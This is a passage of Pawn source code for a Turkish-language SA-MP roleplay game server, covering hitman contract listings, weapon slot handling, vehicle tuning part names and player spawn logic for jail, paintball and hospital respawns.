				format(string, sizeof(string), "Isim: %s (ID %d) | Fiyat: $%d | Kontratý Imzalayan: %s | Detaylar: %s | Kovalayan: Hiçkimse", GetPlayerNameEx(i), i, PlayerInfo[i][pHeadValue], PlayerInfo[i][pContractBy], PlayerInfo[i][pContractDetail]);
				SendClientMessage(playerid, COLOR_GRAD2, string);
			}
			else
			{
				hits++;
  				format(string, sizeof(string), "Isim: %s (ID %d) | Fiyat: $%d | Kontratý Imzalayan: %s | Detaylar: %s | Kovalayan: %s", GetPlayerNameEx(i), i, PlayerInfo[i][pHeadValue], PlayerInfo[i][pContractBy], PlayerInfo[i][pContractDetail], GetPlayerNameEx(GetChased[i]));
				SendClientMessage(playerid, COLOR_GRAD2, string);
			}
  		}
	}
	if(hits && PlayerInfo[playerid][pRank] <= 1 && PlayerInfo[playerid][pFaction] == 4)
	{
		SendClientMessage(playerid, COLOR_YELLOW, "Kendine kontrat tayin etmek için /goreval komutunu kullan.");
	}
	if(hits && PlayerInfo[playerid][pRank] >= 6 && PlayerInfo[playerid][pFaction] == 4 && PlayerInfo[playerid][pLeader] == 4)
	{
		SendClientMessage(playerid, COLOR_YELLOW, "Hitmanlardan birine kontrat tayin etmek için /gorevver komutunu kullan.");
	}
	if(hits == 0)
	{
	    SendClientMessage(playerid, COLOR_GREY, "Imzalanan kontrat yok.");
	}
	return 0;
}

stock GivePlayerValidAdminWeapon(playerid, WeaponID, Ammo)
{
    if(PlayerInfo[playerid][pConnectTime] < 2 && WeaponID != 46 && WeaponID != 43) return 1;
	switch(WeaponID)
	{
  		case 0, 1:
		{
			PlayerInfo[playerid][pAGuns][0] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 2, 3, 4, 5, 6, 7, 8, 9:
		{
			PlayerInfo[playerid][pAGuns][1] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 22, 23, 24:
		{
			PlayerInfo[playerid][pAGuns][2] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 25, 26, 27:
		{
			PlayerInfo[playerid][pAGuns][3] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 28, 29, 32:
		{
			PlayerInfo[playerid][pAGuns][4] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 30, 31:
		{
			PlayerInfo[playerid][pAGuns][5] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 33, 34:
		{
			PlayerInfo[playerid][pAGuns][6] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 35, 36, 37, 38:
		{
			PlayerInfo[playerid][pAGuns][7] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 16, 17, 18, 39, 40:
		{
			PlayerInfo[playerid][pAGuns][8] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 41, 42, 43:
		{
			PlayerInfo[playerid][pAGuns][9] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 10, 11, 12, 13, 14, 15:
		{
			PlayerInfo[playerid][pAGuns][10] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 44, 45, 46:
		{
			PlayerInfo[playerid][pAGuns][11] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
	}
	return 1;
}

stock GivePlayerValidWeapon(playerid, WeaponID, Ammo)
{
    if(PlayerInfo[playerid][pConnectTime] < 2 && WeaponID != 46 && WeaponID != 43) return 1;
	switch(WeaponID)
	{
  		case 0, 1:
		{
			PlayerInfo[playerid][pGuns][0] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 2, 3, 4, 5, 6, 7, 8, 9:
		{
			PlayerInfo[playerid][pGuns][1] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 22, 23, 24:
		{
			PlayerInfo[playerid][pGuns][2] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 25, 26, 27:
		{
			PlayerInfo[playerid][pGuns][3] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 28, 29, 32:
		{
			PlayerInfo[playerid][pGuns][4] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 30, 31:
		{
			PlayerInfo[playerid][pGuns][5] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 33, 34:
		{
			PlayerInfo[playerid][pGuns][6] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 35, 36, 37, 38:
		{
			PlayerInfo[playerid][pGuns][7] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 16, 17, 18, 39, 40:
		{
			PlayerInfo[playerid][pGuns][8] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 41, 42, 43:
		{
			PlayerInfo[playerid][pGuns][9] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 10, 11, 12, 13, 14, 15:
		{
			PlayerInfo[playerid][pGuns][10] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
		case 44, 45, 46:
		{
			PlayerInfo[playerid][pGuns][11] = WeaponID;
			GivePlayerWeapon(playerid, WeaponID, Ammo);
		}
	}
	return 1;
}

stock SetPlayerWeapons(playerid)
{
    if(GetPVarInt(playerid, "PBM") > 0) { return 1; }
	ResetPlayerWeapons(playerid);
	for(new s = 0; s < 12; s++)
	{
		if(PlayerInfo[playerid][pGuns][s] > 0 && PlayerInfo[playerid][pAGuns][s] == 0)
		{
		    if(PlayerInfo[playerid][pGuns][s] == 17)
				GivePlayerValidWeapon(playerid, PlayerInfo[playerid][pGuns][s], 5);
			else
				GivePlayerValidWeapon(playerid, PlayerInfo[playerid][pGuns][s], 60000);
		}
	}
	return 1;
}

stock SetPlayerWeaponsEx(playerid)
{
	ResetPlayerWeapons(playerid);
	for(new s = 0; s < 12; s++)
	{
		if(PlayerInfo[playerid][pGuns][s] > 0)
		{
			GivePlayerValidWeapon(playerid, PlayerInfo[playerid][pGuns][s], 60000);
		}
	}
	SetPlayerArmedWeapon(playerid, GetPVarInt(playerid, "LastWeapon"));
}

stock ResetPlayerWeaponsEx(playerid)
{
	ResetPlayerWeapons(playerid);
	PlayerInfo[playerid][pGuns][0] = 0;
	PlayerInfo[playerid][pGuns][1] = 0;
	PlayerInfo[playerid][pGuns][2] = 0;
	PlayerInfo[playerid][pGuns][3] = 0;
	PlayerInfo[playerid][pGuns][4] = 0;
	PlayerInfo[playerid][pGuns][5] = 0;
	PlayerInfo[playerid][pGuns][6] = 0;
	PlayerInfo[playerid][pGuns][7] = 0;
	PlayerInfo[playerid][pGuns][8] = 0;
	PlayerInfo[playerid][pGuns][9] = 0;
	PlayerInfo[playerid][pGuns][10] = 0;
	PlayerInfo[playerid][pGuns][11] = 0;
	PlayerInfo[playerid][pAGuns][0] = 0;
	PlayerInfo[playerid][pAGuns][1] = 0;
	PlayerInfo[playerid][pAGuns][2] = 0;
	PlayerInfo[playerid][pAGuns][3] = 0;
	PlayerInfo[playerid][pAGuns][4] = 0;
	PlayerInfo[playerid][pAGuns][5] = 0;
	PlayerInfo[playerid][pAGuns][6] = 0;
	PlayerInfo[playerid][pAGuns][7] = 0;
	PlayerInfo[playerid][pAGuns][8] = 0;
	PlayerInfo[playerid][pAGuns][9] = 0;
	PlayerInfo[playerid][pAGuns][10] = 0;
	PlayerInfo[playerid][pAGuns][11] = 0;
	return 1;
}

RemovePlayerWeapon(playerid, weaponid)
{
	new plyWeapons[13];
	for(new s = 0; s < 13; s++)
	{
		new wep, ammo;
		GetPlayerWeaponData(playerid, s, wep, ammo);

		if(wep != weaponid)
		{
			GetPlayerWeaponData(playerid, s, plyWeapons[s], ammo);
		}
		else
		{
			PlayerInfo[playerid][pGuns][s] = 0;
			PlayerInfo[playerid][pAGuns][s] = 0;
		}
	}

	ResetPlayerWeapons(playerid);
 	for(new s = 0; s < 12; s++)
	{
		GivePlayerValidWeapon(playerid, plyWeapons[s], 60000);
	}
	return 1;
}

stock GetWeaponSlot(weaponid)
{
	switch(weaponid)
	{
		case 0, 1:
		{
			return 0;
		}
		case 2, 3, 4, 5, 6, 7, 8, 9:
		{
			return 1;
		}
		case 22, 23, 24:
		{
			return 2;
		}
		case 25, 26, 27:
		{
			return 3;
		}
		case 28, 29, 32:
		{
			return 4;
		}
		case 30, 31:
		{
			return 5;
		}
		case 33, 34:
		{
			return 6;
		}
		case 35, 36, 37, 38:
		{
			return 7;
		}
		case 16, 17, 18, 39, 40:
		{
			return 8;
		}
		case 41, 42, 43:
		{
			return 9;
		}
		case 10, 11, 12, 13, 14, 15:
		{
			return 10;
		}
		case 44, 45, 46:
		{
			return 11;
		}
	}
	return -1;
}

stock partType(type)
{
	new name[32];
	switch(type)
	{
	    case 0:
		{
			name = "Spoiler";
        }
        case 1:
		{
			name = "Hood";
        }
        case 2:
		{
			name = "Roof";
        }
        case 3:
		{
			name = "Sideskirt";
        }
        case 4:
		{
			name = "Lamps";
        }
        case 5:
		{
			name = "Nitro";
        }
        case 6:
		{
			name = "Exhaust";
        }
        case 7:
		{
			name = "Wheels";
        }
        case 8:
		{
			name = "Stereo";
        }
        case 9:
		{
			name = "Hydraulics";
        }
        case 10:
		{
			name = "Front Bumper";
        }
        case 11:
		{
			name = "Rear Bumper";
        }
        case 12:
		{
			name = "Left Vent";
        }
        case 13:
		{
			name = "Right Vent";
        }
        default:
        {
            name = "Bilinmeyen";
		}
	}
	return name;
}

stock partName(part)
{
	new name[32];
	switch(part - 1000)
	{
		case 0:
		{
			name = "Pro";
        }
		case 1:
        {
			name = "Win";
        }
		case 2:
        {
			name = "Drag";
        }
		case 3:
        {
			name = "Alpha";
        }
		case 4:
        {
			name = "Champ Scoop";
        }
		case 5:
        {
			name = "Fury Scoop";
        }
		case 6:
        {
			name = "Roof Scoop";
        }
		case 7:
        {
			name = "Sideskirt";
        }
        case 8:
        {
            name = "2x";
        }
        case 9:
        {
            name = "5x";
        }
        case 10:
        {
            name = "10x";
        }
		case 11:
        {
			name = "Race Scoop";
        }
		case 12:
        {
			name = "Worx Scoop";
        }
		case 13:
        {
			name = "Round Fog";
        }
		case 14:
        {
			name = "Champ";
        }
		case 15:
        {
			name = "Race";
        }
		case 16:
        {
			name = "Worx";
        }
		case 17:
        {
			name = "Sideskirt";
        }
		case 18:
        {
			name = "Upswept";
        }
		case 19:
        {
			name = "Twin";
        }
		case 20:
		{
			name = "Large";
        }
		case 21:
        {
			name = "Medium";
        }
		case 22:
        {
			name = "Small";
        }
		case 23:
        {
			name = "Fury";
        }
		case 24:
        {
			name = "Square Fog";
        }
		case 26:
        {
			name = "Alien";
        }
		case 27:
        {
			name = "Alien";
        }
		case 28:
        {
			name = "Alien";
        }
		case 29:
        {
			name = "X-Flow";
        }
		case 30:
        {
			name = "X-Flow";
        }
		case 31:
        {
			name = "X-Flow";
        }
		case 32:
        {
			name = "Alien Roof Vent";
        }
		case 33:
        {
			name = "X-Flow Roof Vent";
        }
		case 34:
        {
			name = "Alien";
        }
		case 35:
        {
			name = "X-Flow Roof Vent";
        }
		case 36:
        {
			name = "Alien";
        }
		case 37:
        {
			name = "X-Flow";
        }
		case 38:
        {
			name = "Alien Roof Vent";
        }
		case 39:
        {
			name = "X-Flow";
        }
		case 40:
        {
			name = "Alien";
        }
		case 41:
        {
			name = "X-Flow";
        }
		case 42:
        {
			name = "Chrome";
        }
		case 43:
        {
			name = "Slamin";
        }
		case 44:
        {
			name = "Chrome";
        }
		case 45:
        {
			name = "X-Flow";
        }
		case 46:
        {
			name = "Alien";
        }
		case 47:
        {
			name = "Alien";
        }
		case 48:
        {
			name = "X-Flow";
        }
		case 49:
        {
			name = "Alien";
        }
		case 50:
        {
			name = "X-Flow";
        }
		case 51:
        {
			name = "Alien";
        }
		case 52:
        {
			name = "X-Flow";
        }
		case 53:
        {
			name = "X-Flow";
        }
		case 54:
        {
			name = "Alien";
        }
		case 55:
        {
			name = "Alien";
        }
		case 56:
        {
			name = "Alien";
        }
		case 57:
        {
			name = "X-Flow";
        }
		case 58:
        {
			name = "Alien";
        }
		case 59:
        {
			name = "X-Flow";
        }
		case 60:
        {
			name = "X-Flow";
        }
		case 61:
        {
			name = "X-Flow";
        }
		case 62:
        {
			name = "Alien";
        }
		case 63:
        {
			name = "X-Flow";
        }
		case 64:
        {
			name = "Alien";
        }
		case 65:
        {
			name = "Alien";
        }
		case 66:
        {
			name = "X-Flow";
        }
		case 67:
        {
			name = "Alien";
        }
		case 68:
        {
			name = "X-Flow";
        }
		case 69:
        {
			name = "Alien";
        }
		case 70:
        {
			name = "X-Flow";
        }
		case 71:
        {
			name = "Alien";
        }
		case 72:
        {
			name = "X-Flow";
        }
		case 88:
        {
			name = "Alien";
        }
		case 89:
        {
			name = "X-Flow";
        }
		case 90:
        {
			name = "Alien";
        }
		case 91:
        {
			name = "X-Flow";
        }
		case 92:
        {
			name = "Alien";
        }
		case 93:
        {
			name = "X-Flow";
        }
		case 94:
        {
			name = "Alien";
        }
		case 95:
        {
			name = "X-Flow";
        }
		case 99:
        {
			name = "Chrome";
        }
		case 100:
        {
			name = "Chrome Grill";
        }
        		case 101:
        {
			name = "Chrome Flames";
        }
		case 102:
        {
			name = "Chrome Strip";
        }
		case 103:
        {
			name = "Covertible";
        }
		case 104:
        {
			name = "Chrome";
        }
		case 105:
        {
			name = "Slamin";
        }
		case 106:
        {
			name = "Chrome Arches";
        }
		case 107:
        {
			name = "Chrome Strip";
        }
		case 108:
        {
			name = "Chrome Strip";
        }
		case 109:
        {
			name = "Chrome";
        }
		case 110:
        {
			name = "Slamin";
        }
		case 113:
        {
			name = "Chrome";
        }
		case 114:
        {
			name = "Slamin";
        }
		case 115:
        {
			name = "Chrome";
        }
		case 116:
        {
			name = "Slamin";
        }
		case 117:
        {
			name = "Chrome";
        }
		case 118:
        {
			name = "Chrome Trim";
        }
		case 119:
        {
			name = "Wheelcovers";
        }
		case 120:
        {
			name = "Chrome Trim";
        }
		case 121:
        {
			name = "Wheelcovers";
        }
		case 122:
        {
			name = "Chrome Flames";
        }
		case 123:
        {
			name = "Bullbar Chrome Bars";
        }
		case 124:
        {
			name = "Chrome Arches";
        }
		case 125:
        {
			name = "Bullbar Chrome Lights";
        }
		case 126:
        {
			name = "Chrome";
        }
		case 127:
        {
			name = "Slamin";
        }
		case 128:
        {
			name = "Vinyl Hardtop";
        }
		case 129:
        {
			name = "Chrome";
        }
		case 130:
        {
			name = "Hardtop";
        }
		case 131:
        {
			name = "Softtop";
        }
		case 132:
        {
			name = "Slamin";
        }
		case 133:
        {
			name = "Chrome Strip";
        }
		case 134:
        {
			name = "Chrome Strip";
        }
		case 135:
        {
			name = "Slamin";
        }
		case 136:
        {
			name = "Chrome";
        }
		case 137:
        {
			name = "Chrome Strip";
        }
		case 138:
        {
			name = "Alien";
        }
		case 139:
        {
			name = "X-Flow";
        }
		case 140:
        {
			name = "X-Flow";
        }
		case 141:
        {
			name = "Alien";
        }
		case 142:
        {
			name = "Left Oval Vents";
        }
		case 143:
        {
			name = "Right Oval Vents";
        }
		case 144:
        {
			name = "Left Square Vents";
        }
		case 145:
        {
			name = "Right Square Vents";
        }
		case 146:
        {
			name = "X-Flow";
        }
		case 147:
        {
			name = "Alien";
        }
		case 148:
        {
			name = "X-Flow";
        }
		case 149:
        {
			name = "Alien";
        }
		case 150:
        {
			name = "Alien";
        }
		case 151:
        {
			name = "X-Flow";
        }
		case 152:
        {
			name = "X-Flow";
        }
		case 153:
        {
			name = "Alien";
        }
		case 154:
        {
			name = "Alien";
        }
		case 155:
        {
			name = "Alien";
        }
		case 156:
        {
			name = "X-Flow";
        }
		case 157:
        {
			name = "X-Flow";
        }
		case 158:
        {
			name = "X-Flow";
        }
		case 159:
        {
			name = "Alien";
        }
		case 160:
        {
			name = "Alien";
        }
		case 161:
        {
			name = "X-Flow";
        }
		case 162:
        {
			name = "Alien";
        }
		case 163:
        {
			name = "X-Flow";
        }
		case 164:
        {
			name = "Alien";
        }
		case 165:
        {
			name = "X-Flow";
        }
		case 166:
        {
			name = "Alien";
        }
		case 167:
        {
			name = "X-Flow";
        }
		case 168:
        {
			name = "Alien";
        }
		case 169:
        {
			name = "Alien";
        }
		case 170:
        {
			name = "X-Flow";
        }
		case 171:
        {
			name = "Alien";
        }
		case 172:
        {
			name = "X-Flow";
        }
		case 173:
        {
			name = "X-Flow";
        }
		case 174:
        {
			name = "Chrome";
        }
		case 175:
        {
			name = "Slamin";
        }
		case 176:
        {
			name = "Chrome";
        }
		case 177:
        {
			name = "Slamin";
        }
		case 178:
        {
			name = "Slamin";
        }
		case 179:
        {
			name = "Chrome";
        }
		case 180:
        {
			name = "Chrome";
        }
		case 181:
        {
			name = "Slamin";
        }
		case 182:
        {
			name = "Chrome";
        }
		case 183:
        {
			name = "Slamin";
        }
		case 184:
        {
			name = "Chrome";
        }
		case 185:
        {
			name = "Slamin";
        }
		case 186:
        {
			name = "Slamin";
        }
		case 187:
        {
			name = "Chrome";
        }
		case 188:
        {
			name = "Slamin";
        }
		case 189:
        {
			name = "Chrome";
        }
		case 190:
        {
			name = "Slamin";
        }
		case 191:
        {
			name = "Chrome";
        }
		case 192:
        {
			name = "Chrome";
        }
		case 193:
        {
			name = "Slamin";
        }
   	}
	return name;
}

stock SetPlayerSpawn(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    DeletePVar(playerid, "OPD");

	    SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
		if(GetPVarInt(playerid, "SpecOff") == 1)
		{
			SetPlayerPos(playerid, GetPVarFloat(playerid, "SpecPosX"), GetPVarFloat(playerid, "SpecPosY"), GetPVarFloat(playerid, "SpecPosZ"));
			SetPlayerInterior(playerid, GetPVarInt(playerid, "SpecInt"));
			SetPlayerVirtualWorld(playerid, GetPVarInt(playerid, "SpecVW"));
			DeletePVar(playerid, "SpecOff");
			return 1;
		}
		if(PlayerInfo[playerid][pTut] == 0)
		{
			TogglePlayerControllable(playerid,0);
			SetPlayerColor(playerid,TEAM_HIT_COLOR);
			SetPlayerPos(playerid, 766.50, -1684.32, -6.86);
			SetPlayerCameraPos(playerid, 751.93, -1673.95, 16.01);
		   	SetPlayerCameraLookAt(playerid, 699.55, -1628.93, 5.88);
   			ShowPlayerDialogEx(playerid, REGISTRATION_MENU_ONE, DIALOG_STYLE_MSGBOX, "{00ECFF}Phoenix Role Play - Kayýt", "{FFFFFF}Karakterinizin cinsiyetinin ne olmasýný istersiniz?", "Erkek", "Bayan");
			SetPlayerVirtualWorld(playerid, 70707);
			return 1;
		}
		if(AdminDuty[playerid] == 1)
		{
			SetPlayerVirtualWorld(playerid, GetPVarInt(playerid,"AdminDeathVW"));
			SetPlayerInterior(playerid, GetPVarInt(playerid,"AdminDeathInt"));
			DeletePVar(playerid, "AdminDeathVW");
			DeletePVar(playerid, "AdminDeathInt");
			SetPlayerHealth(playerid, 100);
			ClearAnimations(playerid, 1);
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
			DeletePVar(playerid, "Injured");
		    return 1;
		}
		if(GetPVarType(playerid, "posX") != 0)
		{
			DeletePVar(playerid, "Injured");
			cmd_yardimbitir(playerid, "");
		    return 1;
		}

		if(PlayerInfo[playerid][pJailed] == 1)
		{
		    PhoneOnline[playerid] = 1;
		    LoadObjectsForPlayer(playerid);

			SetPlayerInterior(playerid, 6);
			PlayerInfo[playerid][pVW] = 20002;
			PlayerInfo[playerid][pInt] = 6;
			SetPlayerVirtualWorld(playerid, 20002);
			SetPlayerPos(playerid,263.343597, 77.532028, 1001.039062);

			ResetPlayerWeaponsEx(playerid);

			SendClientMessage(playerid, COLOR_LIGHTRED, "Bitmemiþ hapis cezasý, tekrar hapise.");
			return 1;
		}
		if(PlayerInfo[playerid][pJailed] == 2)
		{
		    PhoneOnline[playerid] = 1;
		    LoadObjectsForPlayer(playerid);

			SetPlayerInterior(playerid, 1);
			PlayerInfo[playerid][pVW] = 1324123;
			PlayerInfo[playerid][pInt] = 1;
			SetPlayerVirtualWorld(playerid, 1324123);
			SetPlayerPos(playerid,315.1677,-1451.5564,-33.5292);

			ResetPlayerWeaponsEx(playerid);

			SendClientMessage(playerid, COLOR_LIGHTRED, "Bitmemiþ hapis cezasý, tekrar hapise.");
			return 1;
		}
		if(PlayerInfo[playerid][pJailed] == 3)
		{
		    PhoneOnline[playerid] = 1;
		    LoadObjectsForPlayer(playerid);

			SetPlayerInterior(playerid, 69);
			PlayerInfo[playerid][pVW] = 696969;
			PlayerInfo[playerid][pInt] = 69;
			SetPlayerVirtualWorld(playerid, 696969);

			new rand = random(sizeof(AdminPrisonFloat));
			SetPlayerPos(playerid, AdminPrisonFloat[rand][0], AdminPrisonFloat[rand][1], AdminPrisonFloat[rand][2]);

			ResetPlayerWeaponsEx(playerid);
			SetPlayerColor(playerid, TEAM_APRISON_COLOR);
			SetPlayerSkin(playerid, 50);

			new string[128];
			format(string, sizeof(string), "Hapistesiniz çünkü %s tarafýndan hapse gönderildiniz, sebep: %s", PlayerInfo[playerid][pPrisonedBy], PlayerInfo[playerid][pPrisonReason]);
			SendClientMessage(playerid, COLOR_LIGHTRED, string);
			return 1;
		}
		if(PlayerInfo[playerid][pJailed] == 4)
		{
		    PhoneOnline[playerid] = 1;
		    LoadObjectsForPlayer(playerid);

			SetPlayerInterior(playerid, 69);
			PlayerInfo[playerid][pVW] = 696969;
			PlayerInfo[playerid][pInt] = 69;
			SetPlayerVirtualWorld(playerid, 696969);

			new rand = random(sizeof(AdminPrisonFloat));
			SetPlayerPos(playerid, AdminPrisonFloat[rand][0], AdminPrisonFloat[rand][1], AdminPrisonFloat[rand][2]);

			ResetPlayerWeaponsEx(playerid);
			SetPlayerColor(playerid, TEAM_ORANGE_COLOR);
			SetPlayerSkin(playerid, 50);
			return 1;
		}

		if(GetPVarInt(playerid, "Injured") == 1 && GetPVarInt(playerid, "PBM") < 1)
		{
		    SendEMSQueue(playerid,1);
		    return 1;
		}

		if(GetPVarInt(playerid, "PBM") > 0) {
			GivePlayerValidAdminWeapon(playerid, 24, 99999);
			GivePlayerValidAdminWeapon(playerid, 27, 99999);
			GivePlayerValidAdminWeapon(playerid, 29, 99999);
			GivePlayerValidAdminWeapon(playerid, 31, 99999);

			if(GetPVarInt(playerid, "PBM") > 3) {
				new
					Team1Total,
					Team2Total;

				foreach(Player, i) {
					if(GetPVarInt(i, "PBM") == GetPVarInt(playerid, "PBM")) {
						if(PaintballTeam[i] == 1) Team1Total ++;
						else if(PaintballTeam[i] == 2) Team2Total ++;
					}
				}

				if(Team1Total == Team2Total) {}// happy days.
				else if(Team1Total > Team2Total) PaintballTeam[playerid] = 2;
				else PaintballTeam[playerid] = 1;

				switch(PaintballTeam[playerid]) {
					case 1:	SetPlayerColor(playerid, 0xFFFF0000);
					case 2: SetPlayerColor(playerid, 0x33CCFF00);
				}
			}
			switch(GetPVarInt(playerid, "PBM")) {
			    case 1: { // dm lv warehouse
					SetPlayerPos(playerid, 1059.895996, 2081.685791, 10.820312);
					SetPlayerInterior(playerid, 0); // just for clarity
					SetPlayerVirtualWorld(playerid, 60);
				}
			    case 2: { // dm random warehouse
					SetPlayerPos(playerid, 1283.287841, 5.694778, 1001.011779);
					SetPlayerInterior(playerid, 18);
					SetPlayerVirtualWorld(playerid, 61);
			    }
			    case 3: { // dm rc battlefield
					SetPlayerPos(playerid, -975.975708, 1060.983032, 1345.671875);
					SetPlayerInterior(playerid, 10);
					SetPlayerVirtualWorld(playerid, 62);
				}
			    case 4: { // tdm lv warehouse
					SetPlayerInterior(playerid, 0);
					SetPlayerVirtualWorld(playerid, 63);
					if(PaintballTeam[playerid] == 1) {
						SetPlayerPos(playerid, 1068.6324, 2082.7930, 10.8203);
						SetPlayerFacingAngle(playerid, 359.9999);
						SetPlayerTeam(playerid, 1);
					} else {
						SetPlayerPos(playerid, 1069.3499, 2127.0828, 10.8203);
						SetPlayerFacingAngle(playerid, 181.4610);
						SetPlayerTeam(playerid, 2);
					}
				}
			    case 5: { // tdm random warehouse
					SetPlayerInterior(playerid, 18);
					SetPlayerVirtualWorld(playerid, 64);
					if(PaintballTeam[playerid] == 1) {
						SetPlayerPos(playerid, 1305.5143, 3.6555, 1001.0269);
						SetPlayerFacingAngle(playerid, 0);
						SetPlayerTeam(playerid, 1);
					} else {
						SetPlayerPos(playerid, 1252.7601,-46.6263,1001.0282);
						SetPlayerFacingAngle(playerid, 133.2679);
						SetPlayerTeam(playerid, 2);
					}
			    }
			    case 6: { // tdm rc battlefield
					SetPlayerInterior(playerid, 10);
					SetPlayerVirtualWorld(playerid, 65);
					if(PaintballTeam[playerid] == 1) {
						SetPlayerPos(playerid, -1128.8225, 1057.4939, 1346.4141);
						SetPlayerFacingAngle(playerid, 260);
						SetPlayerTeam(playerid, 1);
					} else {
						SetPlayerPos(playerid, -976.2924, 1061.0496, 1345.6719);
						SetPlayerFacingAngle(playerid, 90);
						SetPlayerTeam(playerid, 2);
					}
				}
			}

			return 1;
		}

		if(GetPVarInt(playerid, "EventToken") == 1) {
		    DeletePVar(playerid, "EventToken");
			DeletePVar(playerid, "EventAnims");
		    SetPlayerWeapons(playerid);
		    SetPlayerPos(playerid,EventFloats[playerid][1],EventFloats[playerid][2],EventFloats[playerid][3]);
			SetPlayerVirtualWorld(playerid, EventLastVW[playerid]);
			SetPlayerFacingAngle(playerid, EventFloats[playerid][0]);
			if(EventLastInt[playerid] > 0 || EventLastVW[playerid] > 0) {
				LoadObjectsForPlayer(playerid);
			}
			SetPlayerInterior(playerid,EventLastInt[playerid]);
			SetPlayerHealth(playerid, EventFloats[playerid][4]);
			SetPlayerArmourEx(playerid, EventFloats[playerid][5]);
			for(new i = 0; i < 6; i++)
			{
			    EventFloats[playerid][i] = 0.0;
			}
			EventLastVW[playerid] = 0;
			EventLastInt[playerid] = 0;
			return 1;
		}
		for(new i; i < sizeof(EventInfo[EventStaff]); i++)
		{
		    if(EventInfo[EventStaff][i] == playerid)
		    {
		        SetPlayerWeapons(playerid);
			    SetPlayerPos(playerid,EventFloats[playerid][1],EventFloats[playerid][2],EventFloats[playerid][3]);
				//PlayerInfo[playerid][pInterior] = PlayerInfo[playerid][pInt];
				SetPlayerVirtualWorld(playerid, EventLastVW[playerid]);
				SetPlayerFacingAngle(playerid, EventFloats[playerid][0]);
				if(EventLastInt[playerid] > 0 || EventLastVW[playerid] > 0) {
					LoadObjectsForPlayer(playerid);
				}
				SetPlayerInterior(playerid,EventLastInt[playerid]);
				SetPlayerHealth(playerid, EventFloats[playerid][4]);
				SetPlayerArmourEx(playerid, EventFloats[playerid][5]);
				for(new d = 0; d < 6; d++)
				{
				    EventFloats[playerid][d] = 0.0;
				}
				EventLastInt[playerid] = 0;
				EventLastVW[playerid] = 0;
				EventInfo[EventStaff][i] = 999;
		    }
		}

		if(GetPVarInt(playerid, "DoktorMasrafi") == 1 && PlayerInfo[playerid][pJailed] == 0 && AdminDuty[playerid] == 0) {
			SendClientMessage(playerid, TEAM_CYAN_COLOR, "Serbest býrakýlmadan önce, hastane çalýþanlarý silahlarýnýza el koyacak.");
			PlayerInfo[playerid][pDuty] = 0;
			PlayerInfo[playerid][pVW] = 0;
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			ResetPlayerWeapons(playerid);

			if(GetPVarInt(playerid, "EventToken") != 1)
				ResetPlayerWeaponsEx(playerid);

			SetPVarInt(playerid, "DoktorMasrafi", 1);
			SetPlayerInterior(playerid, 0);
			new string[70+MAX_PLAYER_NAME];
			if(PlayerInfo[playerid][pInsurance] == 1)
			{
			    if(PlayerInfo[playerid][pWantedLevel] >= 1)
				{
				    SendClientMessage(playerid, COLOR_YELLOW, " Arandýðýnýz bilgisi polise bildirilmiþtir ve polisler yoldalar.");
				    format(string, sizeof(string), " All Saints Hastanesi %s kiþisini aranan olarak rapor etti.", GetPlayerNameEx(playerid));
				    SendRadioMessage(1, DEPTRADIO, string);
					SendRadioMessage(2, DEPTRADIO, string);
				}
				SetPlayerCameraPos(playerid,1188.4574,-1309.2242,13.5625+6.0);
				SetPlayerCameraLookAt(playerid,1175.5581,-1324.7922,18.1610);
				SetPlayerPos(playerid, 1188.4574,-1309.2242,10.5625);
				SetPVarInt(playerid, "Hospital", 1);
			}
			else if(PlayerInfo[playerid][pInsurance] == 2)
			{
			    if(PlayerInfo[playerid][pWantedLevel] >= 1)
				{
				    SendClientMessage(playerid, COLOR_YELLOW, " Arandýðýnýz bilgisi polise bildirilmiþtir ve polisler yoldalar.");
				    format(string, sizeof(string), " County General Hastanesi %s kiþisini aranan olarak rapor etti.", GetPlayerNameEx(playerid));
				    SendRadioMessage(1, DEPTRADIO, string);
					SendRadioMessage(2, DEPTRADIO, string);
				}
				SetPlayerCameraPos(playerid,1999.5308,-1449.3281,13.5594+6.0);
				SetPlayerCameraLookAt(playerid,2036.2179,-1410.3223,17.1641);
				SetPlayerPos(playerid, 1999.5308,-1449.3281,10.5594);
				SetPVarInt(playerid, "Hospital", 2);
			}
			if(PlayerInfo[playerid][pInsurance] == 0)
			{
				new randhos = Random(1,3);
 				switch (randhos)
   				{
    				case 1:
  	    			{
    					if(PlayerInfo[playerid][pWantedLevel] >= 1)
						{
				    		SendClientMessage(playerid, COLOR_YELLOW, " Arandýðýnýz bilgisi polise bildirilmiþtir ve polisler yoldalar.");
